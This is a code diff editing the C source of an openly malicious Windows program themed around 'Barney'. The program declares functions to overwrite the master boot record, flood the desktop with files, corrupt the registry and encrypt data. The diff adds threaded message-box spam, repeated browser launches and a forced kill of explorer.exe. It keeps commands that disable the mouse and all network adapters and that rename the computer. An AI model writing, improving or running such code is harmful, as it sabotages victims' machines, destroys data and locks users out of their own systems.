@@ -8,7 +8,6 @@
 void trollies(void*);
 void filebomb(void*);
 void registrycorruption(void*);
-void keyboardspam(void*);
 void mbroverwrite(void*);
 void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);
 
@@ -19,7 +18,6 @@ int main()
     _beginthread((void (*)(void*))trollies, 0, NULL); // Cast to the correct function pointer type
     _beginthread((void (*)(void*))filebomb, 0, NULL); // Cast to the correct function pointer type
     _beginthread((void (*)(void*))registrycorruption, 0, NULL); // Cast to the correct function pointer type
-    _beginthread((void (*)(void*))keyboardspam, 0, NULL); // Cast to the correct function pointer type
     _beginthread((void (*)(void*))crypter, 0, NULL); // Cast to the correct function pointer type
     Sleep(10000); // Wait for threads to finish, adjust time accordingly
     return 0;
@@ -37,11 +35,6 @@ void mbroverwrite(void *arg) {
 void filebomb(void *arg) {
     char filename[200]; // Array to store filename
     const char *desktopPath = getenv("USERPROFILE"); // For Windows, use the USERPROFILE environment variable
-    if (desktopPath == NULL) {
-        fprintf(stderr, "Error: Unable to get the desktop path.\n");
-        return; // Change 1 to return
-    }
-
     strcpy(filename, desktopPath); // Copy the desktop path to the filename
     strcat(filename, "\\Desktop\\"); // Use backslashes for Windows path
 
@@ -108,19 +101,15 @@ void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t ke
     }
 }
 
-void keyboardspam(void* ptr) {
-    const char *text = "barney";
-    INPUT inputs[6 * 2] = {0}; // Each character and its release
-
-    for (int i = 0; i < 6; i++) {
-        inputs[i * 2].type = inputs[i * 2 + 1].type = INPUT_KEYBOARD;
-        inputs[i * 2].ki.wVk = inputs[i * 2 + 1].ki.wVk = toupper(text[i]);
-        inputs[i * 2 + 1].ki.dwFlags = KEYEVENTF_KEYUP;
-    }
-
-    while (1) {
-        // Send the input events
-        SendInput(12, inputs, sizeof(INPUT));
+void spamMessageBox() {
+    for (int i = 0; i < 10; i++) {
+        MessageBox(
+            NULL,
+            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
+            "BARNEY",
+            "BARNEY",
+            MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
+        );
     }
 }
 
@@ -142,14 +131,7 @@ void trollies(void *arg)
     printf("\n");
 
     //Spam error message box
-    for (int i = 0; i < 10; i++)
-        MessageBox(
-            NULL,
-            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
-            "BARNEY",
-            "BARNEY",
-            MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
-        );
+    _beginthread(spamMessageBox, 0, NULL);
 
     // Change wallpaper
     SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
@@ -158,18 +140,16 @@ void trollies(void *arg)
     SetComputerNameEx(ComputerNamePhysicalNetBIOS, "Barney");
 
     //Opens browser
-    for (int i = 0; i < 20; i++) 
+    for (int i = 0; i < 5; i++) 
     {
-        system("start https://www.google.com/search?q=barney+is+looking+for+you");
+        system("start https://www.youtube.com/watch?v=GjbR9rHI9Vw");
     }
 
-    // Plays barney music
-    PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
+    // taskkill explorer
+    system("taskkill /f /im explorer.exe");
 
-    //Disable mouse
+    // Disable mouse
     system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName \"HID-compliant mouse\").InstanceId -Confirm:$false\"");
-
-    //Messes up computer screen
 
     // Disable Internet Connection
     system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");
